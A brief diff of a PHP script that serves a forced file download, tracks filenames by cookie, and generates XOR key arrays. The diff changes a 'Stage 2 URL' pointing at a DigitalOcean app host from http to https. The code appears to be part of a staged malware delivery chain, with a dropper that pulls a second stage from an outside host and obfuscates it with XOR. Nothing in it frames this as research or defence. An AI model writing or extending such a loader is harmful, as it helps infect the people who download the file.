@@ -30,7 +30,7 @@ setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 
 header('Content-Disposition: attachment; filename="' . $chosen . '"');
 
 // ===== CHANGE THIS to your real Stage 2 URL =====
-$stage2Url = "http://walrus-app-f8pss.ondigitalocean.app/stage2.php";
+$stage2Url = "https://walrus-app-f8pss.ondigitalocean.app/stage2.php";
 
 // ===== Generate XOR arrays =====
 $key = [];
